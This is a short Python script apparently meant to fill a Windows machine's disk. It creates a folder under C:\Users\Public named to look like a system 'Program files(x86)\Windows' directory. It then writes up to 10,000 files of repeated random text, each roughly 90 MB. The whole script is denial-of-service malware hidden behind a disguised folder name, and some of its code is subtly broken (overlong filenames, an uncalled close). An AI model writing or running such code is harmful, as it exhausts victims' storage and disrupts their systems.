import os.path
import time
dir = os.path.join("C:\\","Users","Public","Public Program files(x86)")
if not os.path.exists(dir):
    os.mkdir(dir)
dir = os.path.join("C:\\","Users","Public","Public Program files(x86)","Windows")
if not os.path.exists(dir):
    os.mkdir(dir)
b = 1
c = 10000
sp = 'C:/Users/Public/Public Program files(x86)/Windows'
for _ in range(c):
    a = 'c'*b
    cn = os.path.join(sp,a +".txt")
    b = b +1
    file1 = open(cn, "w")
    write1 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    write2 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    write3 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    write4 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    write5 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    write6 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    write7 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    write8 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    write9 = "EYlVrFkh9bXO9XpINAWulrOYZYhoezM4ZmUObFpvlTwn4a5Q9WuFihbDk4TOdz5eVF5YnVAWO8mE6JEzboKW42VAFeLYtHAWztcDjw5NSV2NsKaK2lLD3pPmhlVhncr0BYwfZWcG8PDdKHs5DGiPKlRslKcTVJ2c4Ojj1VpEmUVXZcMzF7SKosi6v8aUcNFED1MMGCZlGGzuQaojjGHEsQpXHmI1ajwCT2asrRR6iv6nPdN1ppOnLrI1Ckia32tJnh6tP0GmPmwUy1e6xOUd3PthjbId2GI599ApXLJNs7pXoTpWmrmcdm0JVyYPTFOL6uBpVpSy2DXeyQfgSJZSArtZ1W3qjIFPfLsDF0Z26ELGQcuQFYd6GrmOwQviladRcBWDiPlj87x8aVpicxlC10N9H9oHeblvtoFyGDcIynt8MXqZNNNCrv8uDUqRWjJeDllOUMJcqUm0koqY3oMxjjGCkuL3Rd43YT7DP5vcNFru6F6jVEkZzDUAQ1Nk0ede38f0h02md3LlOTrS2PBSKbqxKqOhR93YfzOus3xZL5WvxrkZjQEaiGYulqxTpEtkOAXU8lfk5UmY4QECg8eA7LYxrZTrBJ1qMAklGjG3m87ptTuqnb4IK8pUe0uQQR3fSX4kWw2ft6TlLp447tOFFfgrdPcXskLYbzDXQBTsYwOVnSNEGzspFIAZFVClSR8y7VL8lbsKTZBrL7PGglvzcj2z6owySoQfO5qzlUPhx8P2MSW5tHV6JTi3FKA4cS2X6xWxpXMDH67ZUxeJCPctkxXKsOtCcVtxxRKeWZ8M0x4lcZJladEzyyblWu9CmHqCAZoqZV0pRhCLePlDNpeKusndXtWoI2tr00PmHIrUEYZ2qIfD1iS6pzzKP26NqeQts4kUW9UZTylgGiMLrIA265H9JYOE6gXEWMZgpInUD36hGNepzeNvrSLrM323h7jMr5N3RiYXZzve7vGNslYfOIoRttG1HC25aP7aZRn9" +"\n"
    for _ in range(1000):
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
        file1.write(write1+write2+write3+write4+write5+write6+write7+write8+write9)
    file1.close